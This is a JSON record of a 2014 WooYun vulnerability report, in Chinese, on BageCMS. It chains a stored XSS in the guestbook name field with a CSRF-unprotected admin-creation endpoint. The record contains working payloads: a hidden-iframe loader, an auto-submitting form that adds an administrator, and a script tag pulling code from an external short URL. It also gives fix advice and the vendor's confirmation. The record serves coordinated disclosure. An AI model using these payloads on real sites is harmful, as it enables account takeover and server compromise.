{"id": 56242, "wybug_id": "wooyun-2014-058420", "wybug_title": "bagecms(xss+csrf)双剑合璧可导致getshell！", "wybug_corp": "bagecms.com", "wybug_author": "wutongyu", "wybug_date": "2014-05-07 20:23", "wybug_open_date": "2014-08-05 20:24", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向公众公开  简要描述： 一个xss只出现在前台，或许不能干什么。但是结合csrf呢？ 详细说明：  BageCms是一款基于php5+mysql5开发的多功能开源的网站内容管理系统。使用高性能的PHP5的web应用程序开发框架YII构建，具有操作简单、稳定的特点。默认安装的情况下，留言板的姓名处没有过滤，导致xss漏洞，而后台添加管理员功能没有token限制，导致可添加任意管理员。0x01:测试过程中发现xss不能打后台，后台存在过滤。但是前台留言板js代码可任意执行（50字节，足够让我们引入可控制的js了）存在漏洞的地方：留言咨询\n\n填入跨站代码提交：\n\n成功触发\n\n因为xss到后台之后发现过滤了，我们通过xss+csrf方式去getshell。具体如下，添加xss代码到留言板->csrf添加一个管理员：利用代码如下：1.js\nvar f=document.createElement(\"IFRAME\"); f.id = \"iframe01\"; f.name= \"iframe01\"; f.height=0; f.width=0; f.src='http://localhost/bagecms/1.htm';document.body.appendChild(f);\n引入的那个1.htm内容如下：\n<form action=\"http://localhost/bagecms/index.php?r=admini/admin/create\" method=\"post\" name=\"wutongyu\" id=\"wutongyu\"> <input type=\"text\" name=\"Admin[username]\" value=\"wutongyu2\"/> <input type=\"text\" name=\"Admin[password]\" value=\"wutongyu2\"/> <input type=\"text\" name=\"Admin[status_is]\" value=\"Y\"/> <input type=\"text\" name=\"Admin[group_id]\" value=\"1\"/> </form> <script> document.wutongyu.submit(); </script>\n当然那个f.src的js地址你可以任意选择了，这里我为了测试方便就放自己目录了，实际你可以放自己的网站，等等，这里不多说。然后将我们js地址引入到存在xss漏洞的姓名处：顺便我们通过短连接转换一下（因为有50字符限制，转换下可绕过）\n\n   漏洞证明：  最后在姓名处填入：\n<script src=\"http://t.cn/8s8y1wn\"></script>\n\n\n管理员查看前台留言板之前：\n\n查看了留言板之后：\n\n以管理员身份登入后台，编辑模版getshell：\n\n   修复方案：  过滤姓名处引发的xss漏洞，其次在关键敏感操作加上token认证（譬如管理员添加）   版权声明：转载请注明来源 wutongyu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-12 19:55 厂商回复： 第一版程序因疏忽未检查到位，感谢wutongyu@乌云 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}